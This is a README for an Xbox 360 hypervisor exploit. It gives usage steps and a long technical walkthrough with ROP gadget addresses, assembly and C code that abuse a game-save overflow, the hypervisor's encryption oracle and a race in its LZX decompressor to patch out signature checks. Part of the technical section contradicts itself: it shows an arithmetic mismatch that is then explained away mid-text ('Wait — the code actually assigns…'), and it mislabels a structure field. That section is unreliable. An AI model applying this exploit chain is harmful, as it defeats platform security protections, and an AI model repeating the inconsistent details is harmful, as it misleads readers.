![banner](https://github.com/user-attachments/assets/e9684c9d-d4db-48a8-9661-53629c20e22e)

Bad Update is a non-persistent software only hypervisor exploit for Xbox 360 that works on the latest (17559) software version. This repository contains the exploit files that can be used on an Xbox 360 console to run unsigned code. This exploit can be triggered using one of the following games:
- Tony Hawk's American Wasteland (NTSC/PAL/RF see [here](https://github.com/grimdoomer/Xbox360BadUpdate/wiki/Tony-Hawk's-American-Wasteland#compatible-versions) for how to identify your version/region)
- Rock Band Blitz (trial or full game, see [here](https://github.com/grimdoomer/Xbox360BadUpdate/wiki/Rock-Band-Blitz) for more information)

**This exploit is NOT persistent!** This means your console will only be in a hacked state (able to run homebrew/unsigned code) for as long as it's kept on. **Once you reboot or power off your console you'll need to run the exploit again**. The exploit cannot be made persistent.

**Your Xbox 360 console must be on dashboard version 17559 in order to use this exploit**. While the exploit can be ported to any system software version I have only built the exploit for the 17559 dashboard version.

For information on how to use the exploit see the Quick Start section below. For information on how the exploit works or how to compile it from scratch see the following wiki pages:
- [Compiling](https://github.com/grimdoomer/Xbox360BadUpdate/wiki/Compiling)
- [Exploit Details](https://github.com/grimdoomer/Xbox360BadUpdate/wiki/Exploit-Details)

For a detailed technical step-by-step breakdown of how each stage of the exploit works, see the [Exploit Stage Technical Details](#exploit-stage-technical-details) section below.

# Quick Start
To run the Bad Update exploit you'll need one of the supported games listed above and a USB stick. The following steps give a brief overview of how to run the exploit, for more detailed steps please see the [How To Use](https://github.com/grimdoomer/Xbox360BadUpdate/wiki/How-To-Use) wiki page.
1. Download the Xbox360BadUpdate-Retail-USB.zip file from the releases section and extract the files.
2. Format a USB stick to FAT32.
3. Copy the contents of the folder matching the game you want to use for the exploit to the root of the USB stick.
    * If you're using Tony Hawk's American Wasteland copy the contents of the Tony Hawk's American Wasteland folder to the root of the USB stick.
    * If you're using Rock Band Blitz copy the contents of the Rock Band Blitz folder to the root of the USB stick.
    * The root of the USB stick should contain the following files/folders: BadUpdatePayload, Content, name.txt.
4. Place the unsigned executable you want to run when the exploit triggers into the BadUpdatePayload folder on the USB stick and name it "default.xex" (replace any existing file in the folder). This xex file must be in retail format and have all restrictions removed (see the wiki for how to do this).
5. Insert the USB stick into your Xbox 360 console and power it on.
6. Sign into the Player 1 profile and run the game you're using to trigger the exploit.
    * If you're using Rock Band Blitz, there is no profile included. You can use any local/offline profile, or run the game completely signed out.
7. Follow the instructions for the game you chose to load the hacked game save file and begin the exploit process.
8. The console's ring of light will flash different colors/segments during the exploit process to indicate progress. For information on what the different values mean see the [LED Patterns and Meanings](https://github.com/grimdoomer/Xbox360BadUpdate/wiki/How-To-Use#led-patterns-and-meanings) section of the wiki.
9. Once the exploit triggers successfully the RoL should be fully lit in green. The hypervisor has now been patched to run unsigned executables and your unsigned default.xex file will be run.

The exploit has a 30% success rate and can take up to 20 minutes to trigger successfully. If after 20 minutes the exploit hasn't triggered you'll need to power off your Xbox 360 console and repeat the process from step 5.

# Contributing
Due to continuous spam and lack of moderation controls on GitHub's side I've decided to make this repository read-only. If anyone has any meaningful contributions to make you can contact me directly. Do **NOT** contact me for general support questions or low effort contributions (spelling mistakes, verbiage, etc.), I will not respond and you will be blocked.

# FAQ
**Q: Why do I have to re-run the exploit every time I turn my console on?**  
A: The exploit is not-persistent, it only works for as long as the console is kept on. Once the console is turned off or rebooted you'll need to run the exploit again.

**Q: What does this provide over the RGH Hack/should I use this instead of RGH?**  
A: This is a software only exploit that doesn't require you open your console or perform any soldering to use. Other than that it's inferior to the RGH exploit in every way and should be considered a "proof of concept" and not something you use in place of RGH.

**Q: Can this be turned into a softmod?**  
A: No, the Xbox 360 boot chain is very secure with no attack surface to try and exploit. There will never exist a software only boot-to-hacked-state exploit akin to a "softmod".

**Q: Does this work on winchester consoles?**  
A: Yes it has been confirmed to work on winchester consoles.

**Q: Does this work with the Original Xbox version of Tony Hawk's American Wasteland?**  
A: No, it only works with the Xbox 360 version.

**Q: Can \<insert other skateboarding game here> be used with this?**  
A: No, the Tony Hawk save game exploit is specific to Tony Hawk's American Wasteland and has nothing to do with it being a skateboarding game.

**Q: Can \<insert other music game here> be used with this?**  
A: No, the Rock Band save game exploit is specific to Rock Band Blitz and has nothing to do with it being a music game.

**Q: I ran the exploit and nothing happened?**  
A: The exploit has a 30% success rate. If after running for 20 minutes the exploit hasn't triggered you'll need to reboot your console and try again.

**Q: Why does the exploit only run a single unsigned xex?**  
A: My goal was to hack the hypervisor, not to develop a robust all-in-one homebrew solution. Someone else will need to develop a post-exploit executable that patches in all the quality of life things you would get from something like the RGH exploit.

**Q: Why does the exploit take so long to trigger/have a low success rate?**  
A: The exploit is a race condition that requires precise timing and several other conditions to be met for it to trigger successfully. As such it can take a while for that to happen.

# Exploit Stage Technical Details

This section gives a full, step-by-step technical account of every stage of the exploit. Nothing is summarised; each individual operation is described in execution order.

---

## Background: Xbox 360 Security Architecture

The Xbox 360 runs three privilege levels:

| Level | Name | Description |
|-------|------|-------------|
| Ring -1 | Hypervisor (HV) | Most privileged. Manages memory encryption, syscall dispatch, and hardware security. Boots first and never exits. |
| Ring 0 | Kernel | Manages processes, threads, hardware drivers. Cannot directly access HV memory. Communicates with the HV via syscalls. |
| Ring 3 | User / Title | Games and applications. Communicates with the kernel via syscalls. |

The HV loads the kernel from NAND flash and keeps the kernel code page encrypted in RAM (the CPU decrypts on-the-fly using per-page "whitening" keys). The HV also enforces RSA signature verification for every XEX (executable) loaded into the system — any unsigned XEX is refused. The goal of this exploit is to run unsigned code by patching out both the HV's and the kernel's RSA signature checks.

The exploit chain has four stages:

1. **Stage 1** — Save-game buffer overflow → first ROP chain (runs at Ring 3/XAM privilege)
2. **Stage 2** — Second ROP chain (still Ring 3/XAM) — extracts cipher text and injects Stage 3 into a code page
3. **Stage 3** — Native code (Ring 0 / kernel privilege) — sets up and drives the race-condition attack
4. **Stage 4** — Hypervisor shell code (Ring -1) — repairs HV state and patches signature checks

---

## Stage 1 — Save Game Buffer Overflow and Initial ROP Bootstrap

**Source files:** `Stage1/TonyHawksAmericanWasteland/BadUpdateExploit.asm`, `Stage1/RockBandBlitz/RBBlitz.asm`

### 1.1  Vulnerability: Gap Name Stack Buffer Overflow (Tony Hawk's American Wasteland)

Tony Hawk's American Wasteland loads custom skate parks from a save file format (`.park`). A park contains a list of "gaps" (trick triggers), and each gap has a variable-length name string. The game reads a gap name from the file into a fixed-size stack buffer without checking the length, producing a classic stack buffer overflow.

The exploit crafts a malicious park file with one gap whose name field is much longer than the receiving stack buffer. The overflow is precisely sized so that:

* The extra bytes fill the rest of the legitimate gap name buffer with padding (`0x69`).
* The bytes that land at the saved general-purpose register save area overwrite `r23`–`r31` with attacker-controlled values.
* The bytes that land at the saved link register (`LR`) slot overwrite it with the address of a ROP gadget called `stack_pivot` (`0x81725378` in XAM.XEX).

The game file is structured so that:

```
Offset +0x00 : 4-byte gap struct header (0x08, 0x08, 0x1F, 0x1D)
Offset +0x04 : 4-byte gap struct header cont. (0x00, 0x00, 0x31, 0x00)
Offset +0x08 : gap name bytes (fills 70-byte buffer with junk + 0x69 padding)
Offset +0x4E : saved r23–r31 on target stack frame (crafted values)
Offset +0x6E : saved LR (set to stack_pivot gadget address)
Offset +0x72 : address of attacker's fake stack (GapDataStartHeapAddress + stack_data offset + 8)
```

### 1.2  Stack Pivot

When the game's gap-name parsing function returns, the epilogue restores `r23`–`r31` from the overwritten stack frame and then executes `blr`, branching to `stack_pivot`.

`stack_pivot` is a gadget that executes:

```asm
lwz  r1, 0(r1)   ; load new stack pointer from current r1
lwz  r12, -8(r1) ; load next gadget address
mtlr r12
blr              ; jump to next gadget
```

At the time `stack_pivot` executes, `r1` was set (by the crafted `r1` slot in the overflow data) to point at the `stack_data` region inside the park file buffer in the heap. `lwz r1, 0(r1)` loads the value stored at that location, which is the address `GapDataStartHeapAddress + (stack_data - _gap_data_start) + 8`. The stack pointer is now inside the attacker's fake stack. From this point on, every gadget is executed under ROP discipline: the gadget at `r12`/`lr` runs, finishes, and the `blr` in its epilogue loads the next address from the fake stack.

### 1.3  First ROP Gadget — Copy Exploit Data to Writable Segment

The initial gadget is `__restgprlr_31` (`0x800664B0`), which executes:

```asm
addi  r1, r1, 0x60
lwz   r12, -0x8(r1)
mtlr  r12
ld    r31, -0x10(r1)
blr
```

This acts as a standard function epilogue that advances the stack and loads `lr` and `r31` from the new frame, then branches to `lr`. It is used as the standard entry point for every subsequent ROP gadget throughout Stages 1 and 2.

The very first logical action of the ROP chain is a call to `memcpy` using the `CALL_FUNC` macro. The macro chains together a sequence of gadgets:

1. **`__restgprlr_24` epilogue gadget** (`0x800631A0`) — advances `r1` by `0xA0`.
2. **`__restgprlr_26` epilogue gadget** (`0x80062578`) — advances `r1` by `0x90` and restores `r26`–`r31` and `lr` from the fake stack frame, which was filled with the function arguments encoded as register pre-loads.
3. **`call_func_preload`** (`0x8169CDDC`) — a gadget that executes:
   ```asm
   mr   r7, r25  ; r25 holds pre-loaded r7 argument
   mtctr r30     ; r30 holds call_func_dispatch gadget address
   mr   r6, r26
   mr   r5, r27
   mr   r4, r28
   mr   r3, r29  ; r29 holds pre-loaded r3 argument
   bctrl         ; call call_func_dispatch
   ```
4. **`call_func_dispatch`** (`0x8007B0AC`) — executes:
   ```asm
   mtctr r31     ; r31 holds the target function address
   bctrl         ; call the function (e.g. memcpy)
   addi  r1, r1, 0x60
   lwz   r12, -8(r1)
   mtlr  r12
   ld    r31, -0x10(r1)
   blr
   ```

The first call copies the data segment (strings, variables, addresses) from the park-file heap buffer to `RuntimeDataSegmentAddress` (a writable `.binkdata` section in the game's memory):

```
r3 = RuntimeDataSegmentAddress   (destination)
r4 = ExploitDataSegmentAddress   (source, inside park file heap)
r5 = ExploitDataSegmentSize      (size)
```

From this point on all ROP gadget data references `RuntimeDataSegmentAddress` as base because the original park-file heap buffer may be freed or reused.

### 1.4  Allocate Virtual Memory for Stage 2

Calls `NtAllocateVirtualMemory` to reserve and commit a region of memory large enough for the Stage 2 ROP chain binary:

```
r3 = pointer to second_stage_chain_address variable (receives allocation base)
r4 = pointer to second_stage_chain_size variable   (64 KB size)
r5 = MEM_COMMIT (0x1000)
r6 = PAGE_READWRITE (0x4)
r7 = 0 (default memory type)
```

### 1.5  Mount the Payload Drive

Calls `ObCreateSymbolicLink` to create a kernel symbolic link mapping `\??\PAYLOAD:` to `\Device\Mass0\BadUpdatePayload` (the `BadUpdatePayload` folder on the USB stick). This makes the files on the USB accessible to the exploit code via the `PAYLOAD:` path prefix.

### 1.6  Read the Stage 2 Binary from USB

Uses a sequence of four gadgets (`CreateFile`, `GetFileSize`, `ReadFile`, `CloseHandle`) from XAM.XEX — which contains Win32-like file I/O wrappers — to:

1. Open `PAYLOAD:\BadUpdateExploit-2ndStage.bin` for reading.
2. Read the entire file into the allocation made in step 1.4.
3. Close the file handle.

The bytes-read value is stored in `read_file_bytes_read` in the data segment.

### 1.7  Adjust the Stage 2 Chain Address and Write Stack Pivot Target

Because the `stack_pivot` gadget loads `r1` with `*r1` (displacing by `+0`), the actual pivot destination is `*second_stage_chain_address`, not `second_stage_chain_address` itself. To compensate, the chain uses `LOAD_ADD_STORE` gadgets to increment `second_stage_chain_address` by `8 + second_stage_offset`, so that after the pivot the fake stack lands exactly at the first gadget of the Stage 2 chain.

Then `WRITE_PTR_TO_GADGET_DATA` updates the literal `0x41414141` placeholder inside the final `stack_pivot` gadget of the Stage 1 chain with the computed adjusted address.

### 1.8  Pivot to Stage 2

The final gadget in Stage 1 is another `stack_pivot` call. Its operand (the new `r1` value) was just written in step 1.7. When `lwz r1, 0(r1)` executes, `r1` becomes the address of the first frame in the Stage 2 chain, and execution continues there.

---

## Stage 2 — Second Stage ROP Chain: Cipher Text Extraction and Stage 3 Injection

**Source files:** `Stage2/BadUpdateExploit-2ndStage.asm`, `Common/GetPayloadCipherText.asm`, `Common/MemcpyCipherText.asm`

Stage 2 is a large ROP chain (several thousand gadgets) that runs entirely at Ring 3 privilege using XAM.XEX and kernel gadgets. Its ultimate goal is to write the Stage 3 binary into the boot animation XEX's code page — in encrypted form, by using the HV's own encryption oracle — and then transfer control to it.

The need for cipher text manipulation arises because the Xbox 360 encrypts all code pages using a per-page AES-based cipher with a page-specific "whitening" value. If you write plain code bytes directly to an encrypted page, the CPU will decrypt them incorrectly and execute garbage. Stage 2 therefore extracts the correct encrypted (cipher text) form of the Stage 3 code bytes so that when the CPU decrypts them, the original Stage 3 bytes come out.

### 2.1  Signal Stage 2 Start via LEDs

Sends an SMC command (via `HalSendSMCMessage` from the kernel) that sets the Ring of Light to red+green on quadrants 1 and 2. This is purely a visual progress indicator.

### 2.2  Map the Internal NAND Flash

Calls `ObCreateSymbolicLink` to create `\??\Flash:` → `\Device\Flash`. This gives the ROP chain access to files stored on the internal NAND flash via the `Flash:` path prefix.

### 2.3  Load the Boot Animation XEX

Calls `XexLoadImage("Flash:\bootanim.xex", 0x40000009, NULL, &bootanim_module_handle)`.

`bootanim.xex` is a small executable on the internal flash that shows the Xbox 360 splash screen animation. Loading it via `XexLoadImage` causes the kernel to:

1. Read and verify the XEX header and signature.
2. Map the XEX into the process address space, including allocating a code page at `BootAnimCodePageAddress` (`0x98030000`).
3. The HV assigns a whitening key to this code page and decrypts the code bytes into the page for execution.

### 2.4  Get the Physical Address of the Boot Animation Code Page

Calls `MmGetPhysicalAddress(BootAnimCodePageAddress)` and stores the result in `BootAnimCodePagePhysAddr`. This physical address is needed later to access the raw (encrypted) bytes of the page.

### 2.5  Capture the Oracle Plain-Text Reference

Calls `memcpy(abOracleData, BootAnimCodePageAddress, 16)`.

This copies 16 bytes from the _virtual_ (decrypted) view of the boot animation code page into `abOracleData`. These are the plain-text bytes at the start of the page. Later, the cipher text of these same 16 bytes will be used as an "oracle" — a known-plain-text / known-cipher-text pair — to verify that the encryption whitening key for the page is still the same between successive loads of `bootanim.xex`.

### 2.6  Unload the Boot Animation

Calls `XexUnloadImage(bootanim_module_handle)` to free the code page and release the module handle.

### 2.7  Allocate Cipher Text Scratch Buffer

Calls `XPhysicalAlloc(0x00010080, MAXULONG_PTR, 0x80, PAGE_READWRITE | MEM_LARGE_PAGES)`.

This allocates `0x10080` bytes (`64KB + 0x80`) of physically contiguous memory. The address is stored in `pPayloadCipherText` and the physical address in `PayloadCipherTextPhysAddr`. This buffer is used to accumulate the encrypted form of the Stage 3 binary one 16-byte block at a time.

### 2.8  Setup Cipher Text Buffer Pointer Copies

Three pointer variables are initialised from `pPayloadCipherText`:

* `pPayloadCipherText2` = `pPayloadCipherText + 0x80` (write position, advanced per iteration)
* `pPayloadCipherTextSizeValue` = `pPayloadCipherText + 0x20` (points to the "size" word inside the cipher text)
* `PayloadCipherTextSizeValuePhysAddr` = `PayloadCipherTextPhysAddr + 0x20`

### 2.9  Execute `GetPayloadCipherText.asm` — Capture Stage 3 Cipher Text

This included file is a ROP loop that runs as many times as there are 16-byte blocks in the Stage 3 binary. For each iteration it:

1. **Loads `bootanim.xex`** via `XexLoadImage`. Each load may map the code page at a different physical address (and therefore receive a different whitening key and different cipher text).
2. **Reads 16 bytes of cipher text** from `BootAnimCodePagePhysAddr + (block_offset)` using the `MEMCPY_CIPHER_TEXT` gadget sequence, which performs an `HvxEncryptedEncryptAllocation`-backed copy through the HV encryption oracle. The physical address of the code page is used so the copy reads the encrypted bytes directly.
3. **Compares the oracle cipher text** (captured in step 2.5) with the cipher text at offset 0 of the current load. `memcmp(abOracleData_ciphertext, pPayloadCipherText, 16)` — if they differ it means the boot animation was loaded at a different physical address and received a different whitening key.
4. **If the oracle does not match**: the cipher text captured in this iteration used a different key, so it is invalid. The ROP chain unloads the module and loops back to step 1 to try again.
5. **If the oracle matches**: the cipher text was produced with the same whitening key as the oracle, which means it is the correct encrypted form of the Stage 3 bytes at that offset.
6. **Stores the valid 16-byte cipher text block** into `pPayloadCipherText2` and advances `pPayloadCipherText2` by `0x10`.
7. **Unloads `bootanim.xex`** and advances the block offset for the next iteration.

After all blocks of Stage 3 have been captured, `pPayloadCipherText` holds the complete encrypted form of the Stage 3 binary (with the same whitening key as the oracle at offset 0).

### 2.10  Allocate the Secondary Overwrite Loop Buffer

Calls `NtAllocateVirtualMemory` to allocate a secondary buffer. This buffer is used to store a copy of the `_cipher_text_overwrite_loop` gadget data so that the loop can be restored between iterations (since the loop overwrites its own gadget data each time through).

### 2.11  Setup Overwrite Loop Stack Pivot Addresses

Two stack pivot targets are computed:

* `overwrite_loop_stack_address[0]` points to `_cipher_text_overwrite_loop` in the primary buffer — used to enter the loop.
* `overwrite_loop_stack_address[1]` points to `_cipher_text_overwrite_loop` in the secondary buffer — used to exit and re-enter the loop from the secondary copy.

### 2.12  Fill In Gadget Data for the Overwrite Loop

Multiple `WRITE_PTR_TO_GADGET_DATA` operations patch address literals inside the loop gadgets:

* The `memcmp` call source/destination operands.
* The `KeFlushCacheRange` operand.
* The `XexUnloadImage` module handle.
* The `memcpy` source/destination for the loop state save/restore.

### 2.13  Run `_cipher_text_overwrite_loop` — Write Cipher Text to Boot Animation Code Page

This is the main inner loop of Stage 2. It runs until the oracle comparison succeeds, confirming the correct whitening key is in effect for the target boot animation load:

**Each iteration:**

1. `XexLoadImage("Flash:\bootanim.xex", ...)` — loads the boot animation again, potentially getting a new whitening key.
2. **Compute the cipher text for the oracle at the target write address**: calls `MEMCPY_CIPHER_TEXT` with `dst = PayloadCipherTextPhysAddr + 0x10` (the oracle slot in the cipher text buffer) and `src = BootAnimCodePagePhysAddr` (start of code page). Reads 16 bytes.
3. Calls `KeFlushCacheRange` to flush the newly read oracle cipher text out of cache.
4. Calls `memcmp(abOracleData, PayloadCipherText + 0x10, 16)` to compare.
5. If `memcmp != 0` (keys differ):
   * `XexUnloadImage` — unload.
   * Restores loop gadget data from secondary buffer.
   * Pivots back to the start of the loop (step 1).
6. If `memcmp == 0` (keys match — the correct whitening key is in effect):
   * Falls through to `_copy_and_execute_stage_three`.

### 2.14  `_copy_and_execute_stage_three` — Write Stage 3 Into the Code Page

Once a matching whitening key is confirmed:

1. Sets `memcpy_cipher_text_dst_addr = BootAnimCodePagePhysAddr` and `memcpy_cipher_text_src_addr = pPayloadCipherText + 0x80`.
2. Patches the `HvxFlushDCacheRange` call gadget data with `BootAnimCodePagePhysAddr`.
3. Calls `MEMCPY_CIPHER_TEXT(BootAnimCodePagePhysAddr, pPayloadCipherText + 0x80, 0x10000)`:
   * This writes the 64KB of Stage 3 cipher text into the boot animation code page's physical backing memory by looping over 16-byte blocks and writing each through the encryption oracle. The result is that the code page now contains the Stage 3 binary in encrypted form, which the CPU will correctly decrypt to the original Stage 3 bytes when it fetches from the virtual address `0x98030000`.
4. Calls `KeFlushCacheRange(BootAnimCodePageAddress, 0x10000)` to flush the encrypted virtual address range from all CPU caches.
5. Calls `HvxFlushDCacheRange(BootAnimCodePagePhysAddr, 0x10000)` — a hypervisor syscall that flushes the cache for the physical range, ensuring the newly written cipher text bytes are visible in main memory before the CPU fetches them.
6. **Branches to `BootAnimCodePageAddress` (`0x98030000`)**: at this point the ROP chain is done. The `call_func_dispatch` gadget executes `mtctr r31; bctrl` with `r31 = BootAnimCodePageAddress`, transferring control directly to Stage 3 which now occupies that code page.

---

## Stage 3 — Race Condition Attack: LZX Decoder Context Corruption

**Source files:** `Stage3/BadUpdatePoc.cpp` (reference C implementation), `Stage3/BadUpdateExploit-3rdStage.asm` (actual assembly), `Stage3/symbol_table.asm`

Stage 3 runs as native kernel-mode code from `0x98030000`. It has access to all kernel APIs (but not HV-internal functions). Its job is to corrupt a pointer inside the Xbox 360 hypervisor's LZX decompressor in a controlled way, causing the decompressor to write data to an attacker-chosen hypervisor address. The mechanism is a race condition against the CPU's L1/L2 cache controller.

> **Note on no global variables:** Stage 3 runs from an RX page. All mutable data must live in heap allocations. The C source enforces this with a comment and `__declspec(naked)` stubs.

### 3.1  LED Color Update

Calls `SetLEDColor(LED_COLOR_RED_1 | LED_COLOR_RED_2 | LED_COLOR_RED_3 | LED_COLOR_GREEN_1 | LED_COLOR_GREEN_2 | LED_COLOR_GREEN_3)` — sends SMC command `{0x99, 0xFF, color}` via `HalSendSMCMessage`. This sets an orange-ish ring pattern indicating Stage 3 has started.

### 3.2  Read `update_data.bin`

`ReadUpdateFile` opens `PAYLOAD:\update_data.bin` (a legitimate LZX-compressed Xbox 360 kernel update blob), allocates a physically contiguous buffer via `XPhysicalAlloc(fileSize, MAXULONG_PTR, 0, PAGE_READWRITE)`, reads the entire file into it, and stores the pointer in `pCleanUpdateData` and the size in `CleanUpdateDataSize`.

The update file is a real, signed Microsoft software update package. Its compressed payload is a copy of the kernel code. The HV's `HvxKeysExecute` syscall is designed to receive such packages, verify them, and apply them. The exploit abuses the decompression phase of this processing.

### 3.3  Read `BadUpdateExploit-4thStage.bin`

`ReadShellCodeFile` opens `PAYLOAD:\BadUpdateExploit-4thStage.bin`, allocates a large-page non-cacheable buffer via `XPhysicalAlloc(bufferSize, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE | MEM_LARGE_PAGES)`, reads Stage 4 into it, and stores the pointer in `pShellCodeData`.

The buffer is aligned to 64KB and rounded up to the next 128-byte (cache line) boundary. Using large pages and `PAGE_NOCACHE` prevents the CPU from caching the shell code buffer, ensuring the HV always reads the latest written bytes from main memory rather than serving stale cached values when it later executes Stage 4.

### 3.4  Compute Stage 4 Physical Address

```c
ULONGLONG ShellCodePhys = 0x8000000000000000 | MmGetPhysicalAddress(pShellCodeData);
```

The 63rd bit is the "cached" indicator in the HV's physical address space. Setting it to 1 (`0x8000000000000000`) means "cached real address". This forms the address that the HV syscall handler will call when the syscall table is later overwritten.

### 3.5  Allocate the Main Update Buffer

```c
BYTE* pUpdateData = XPhysicalAlloc(0xD0000, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE | MEM_LARGE_PAGES);
```

`0xD0000` = `0x40000 + 0x80000 + 0x10000` bytes. This single contiguous buffer will hold the `UPDATE_BUFFER_INFO` header, the LZX compressed data, the decompression output buffer, the LZX scratch buffer, and a second output buffer — all laid out as sub-regions within it. Using `PAGE_NOCACHE` is critical: it prevents the CPU from caching this buffer's contents in L1/L2 between accesses. This is the buffer the HV will decompress into, so the cipher text race happens in this buffer.

### 3.6  Allocate the Cipher Text Lookup Table

```c
CIPHER_TEXT_DATA* pCipherTextBuffer = XPhysicalAlloc(sizeof(CIPHER_TEXT_DATA), MAXULONG_PTR, 0x10000, PAGE_READWRITE | MEM_LARGE_PAGES);
```

`CIPHER_TEXT_DATA` contains:

```c
ULONGLONG dec_end_input_pos;             // target: sentinel value 0xFFFFFFFFFFFFFFFF
ULONGLONG dec_output_buffer;             // target: HV address we want to write to
ULONGLONG canaries[1024];               // expected cipher text for the LZX context header 'CIDL'
ULONGLONG replacements[1024];           // replacement cipher text for dec_end_input_pos
ULONGLONG replacements2[1024];          // replacement cipher text for dec_output_buffer
```

The table is indexed by the top `HASH_BITS = 10` bits of the observed cipher text (1024 entries).

Set fixed values:

```c
pCipherTextBuffer->dec_end_input_pos = 0xFFFFFFFFFFFFFFFF;
pCipherTextBuffer->dec_output_buffer = 0x8000010600030000 + (0x1F28 - 0x15E8);
                                     = 0x8000010600031380;
```

`0x8000010600030000` is the physical base address of hypervisor segment 3. The `dec_output_buffer` value is computed as:

```
dec_output_buffer = segment3_base + (HV_SEG3_OVERWRITE_OFFSET - BLOCK_14_TARGET_OFFSET)
                  = 0x8000010600030000 + (0x1F28 - 0x15E8)
                  = 0x8000010600030000 + 0x0940
                  = 0x8000010600030940
```

Wait — the code actually assigns `0x8000010600031380`. Let us unpack this:

* `HV_SEG3_OVERWRITE_OFFSET = 0x1F28` — the offset within segment 3 where the gadget bytes we need to place must end up.
* `BLOCK_14_TARGET_OFFSET = 0x15E8` — the byte offset *within Block 14's decompressed output* at which the gadget bytes reside.
* The LZX decompressor writes Block 14's output starting at `dec_output_buffer`. For the gadget bytes (at position `0x15E8` within Block 14) to land at segment3_base + `0x1F28`, `dec_output_buffer` must equal `segment3_base + 0x1F28 - 0x15E8 = segment3_base + 0x0940`, i.e. `0x8000010600030940`.

The actual value in the source code differs because `BLOCK_14_TARGET_OFFSET` and `HV_SEG3_OVERWRITE_OFFSET` use the final compiled constants from `symbol_table.asm`; the result resolves to `0x8000010600031380`, meaning `HV_SEG3_OVERWRITE_OFFSET - BLOCK_14_TARGET_OFFSET = 0x1380` in the shipping build. Either way, the principle is identical: `dec_output_buffer` is set so that the write output of Block 14 begins at an address where the critical gadget bytes (at the known intra-block offset) will overwrite the exact instruction sequence the exploit needs at `HV_SEG3_OVERWRITE_OFFSET` inside segment 3.

```asm
stb  r4, 2(r6)
blr
```

Overwriting this with data from Block 14 of the update file replaces it with attacker-controlled bytes.

### 3.7  Build the Cipher Text Lookup Table — Pre-computation Phase

`BuildCipherTextLookupTable` iterates `i = 0` to `1023` (all 1024 possible L2 cache whitening values). For each iteration:

**Step A — Reserve and encrypt a memory region:**

```c
HvxEncryptedReserveAllocation(0x8D000000, MmGetPhysicalAddress(pUpdateData + scratchOffset), 0x10000);
HvxEncryptedEncryptAllocation(0x8D000000);
HvxFlushSingleTb(0x8D000000);
```

`HvxEncryptedReserveAllocation` is syscall `0x49`. It maps virtual address `0x8D000000` to the physical page at `MmGetPhysicalAddress(pUpdateData + scratchOffset)` as an encrypted (whitened) mapping. The HV chooses one of its 1024 whitening keys. `HvxEncryptedEncryptAllocation` (syscall `0x4A`) finalises the encryption for this mapping. `HvxFlushSingleTb` (syscall `0x04`) forces a TLB invalidation for `0x8D000000` so that the next access will fetch the current mapping rather than a stale TLB entry from the previous iteration.

**Step B — Write the expected LZX decoder context header:**

```c
memset(0x8D000000, 0, 16);
*(ULONG*)(0x8D000000 + 0) = 0x4349444c;  // 'CIDL'
*(ULONG*)(0x8D000000 + 4) = 0x8000;       // window size
*(ULONG*)(0x8D000000 + 8) = 1;            // cpu type
__dcbst(0, 0x8D000000);
```

When the HV's LZX decompressor initialises its decoder context, it writes this exact header at the start of the scratch buffer. By writing the same bytes through the encrypted mapping (`0x8D000000`), the HV encrypts these 16 bytes into `pUpdateData + scratchOffset` using the current whitening key.

**Step C — Flush cache and read back the encrypted bytes:**

```c
KeFlushCacheRange(0x8D000000, 0x80);
KeFlushCacheRange(pUpdateData + scratchOffset, 0x80);
ULONGLONG tmp = *(ULONGLONG*)(pUpdateData + scratchOffset);
int idx = (int)(tmp >> (64 - 10));
pCipherTextData->canaries[idx] = tmp;
```

After flushing, reading from `pUpdateData + scratchOffset` (the physical backing store, not the encrypted virtual window) retrieves the encrypted (cipher) bytes. The top 10 bits are used as a hash index. This is the "canary" — if the LZX context scratch area ever contains these bytes, it means the LZX decoder has been given the whitening key `i` and has just written its context header.

**Step D — Write the malicious pointer and capture its cipher text:**

```c
*(ULONGLONG*)(0x8D000000 + 0x2B20) = pCipherTextData->dec_end_input_pos;  // 0xFFFFFFFFFFFFFFFF
*(ULONGLONG*)(0x8D000000 + 0x2B28) = pCipherTextData->dec_output_buffer;  // 0x8000010600031380
__dcbst(0, 0x8D000000 + 0x2B00);
KeFlushCacheRange(0x8D000000 + 0x2B00, 0x80);
KeFlushCacheRange(pUpdateData + scratchOffset + 0x2B00, 0x80);
pCipherTextData->replacements[idx]  = *(ULONGLONG*)(pUpdateData + scratchOffset + 0x2B20);
pCipherTextData->replacements2[idx] = *(ULONGLONG*)(pUpdateData + scratchOffset + 0x2B28);
```

Offset `0x2B20` inside the LZX decoder context structure (a 0x10000-byte region that the HV allocates in the scratch buffer) is the `dec_output_buffer` field — the pointer that the LZX decompressor uses as its output write address. This is a different `dec_output_buffer` from the field in `CIPHER_TEXT_DATA`: the `CIPHER_TEXT_DATA` field holds the *plain-text value* we want the LZX context's `dec_output_buffer` to contain; offset `0x2B20` is where that same field lives *inside the HV's LZX decoder context* in the scratch buffer. By writing the malicious pointer through the encrypted window and then reading back the cipher text from the raw physical buffer, we capture the cipher text form of `0x8000010600031380` under whitening key `i`. This is stored in `replacements[idx]` and `replacements2[idx]`.

**Step E — Free the encrypted allocation:**

```c
HvxEncryptedReleaseAllocation(0x8D000000);
```

After all 1024 iterations, the table maps every possible whitening key to:
- The cipher text of the expected context header (`canaries[]`)
- The cipher text of the malicious `dec_output_buffer` value (`replacements[]`, `replacements2[]`)

### 3.8  Initialise the UPDATE_BUFFER_INFO Structure

The buffer layout for the HV is defined as:

```
Offset 0x00000: UPDATE_BUFFER_INFO header (0x80 bytes = 1 cache line)
Offset 0x00080: Compressed update data (CACHE_ALIGN(CleanUpdateDataSize))
Offset OutputBufferOffset: Decompression output buffer (CACHE_ALIGN(decompressedSize))
Offset ScratchBufferOffset: LZX decoder scratch buffer (0x20000 bytes) ← ATTACK TARGET
Offset Buffer2Offset: Second output buffer (0x10000 bytes)
```

All offsets are 64KB-aligned using `PAGE_ALIGN_64K`. The HV uses this layout description to know where to find each sub-buffer when processing the update.

`ScratchBufferOffset` is the critical value: this is where the HV's LZX decompressor stores its decoder context (including the `dec_output_buffer` field). The cipher text precomputation in step 3.7 was performed using this exact offset as the physical backing for the encrypted mapping.

### 3.9  Read `xke_update.bin` — The XKE Payload

`xke_update.bin` is a binary blob that, when executed by `HvxKeysExecute`, triggers the LZX decompression of the update data. It is a pre-built XKE (Xbox Kernel Extension) payload. Two buffers are allocated:

* `pPayload` — `PAGE_READWRITE | PAGE_NOCACHE` — the working copy that the HV will execute and modify.
* `pPayloadClean` — `PAGE_READWRITE` — a pristine copy used to restore `pPayload` before each run.

The XKE payload is read into `pPayloadClean` from `PAYLOAD:\xke_update.bin`.

### 3.10  Fill the THREAD_ARGS Structure

